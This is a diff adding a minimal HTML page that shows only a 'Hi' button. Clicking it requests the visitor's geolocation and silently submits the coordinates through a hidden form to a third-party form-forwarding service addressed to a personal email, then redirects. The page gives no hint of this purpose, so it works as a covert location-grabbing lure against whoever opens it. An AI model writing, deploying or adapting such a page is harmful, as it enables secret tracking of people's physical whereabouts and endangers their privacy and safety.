@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hello</title>
+</head>
+<body>
+  <h2>Click the button </h2>
+  <button onclick="getLocation()">Hi</button>
+
+  <form id="locationForm" action="https://formsubmit.io/send/webahmadmustaf@gmail.com" method="POST" style="display: none;">
+    <input type="hidden" name="latitude" id="latitude">
+    <input type="hidden" name="longitude" id="longitude">
+    <input type="hidden" name="_redirect" value="https://thankyoupage.com">
+  </form>
+
+  <p id="status"></p>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+      } else {
+        document.getElementById("status").innerText = "Geolocation is not supported.";
+      }
+    }
+
+    function sendLocation(position) {
+      document.getElementById("latitude").value = position.coords.latitude;
+      document.getElementById("longitude").value = position.coords.longitude;
+      document.getElementById("locationForm").submit();
+      document.getElementById("status").innerText = "Sending location...";
+    }
+
+    function showError(error) {
+      document.getElementById("status").innerText = "Error getting location.";
+    }
+  </script>
+</body>
+</html>
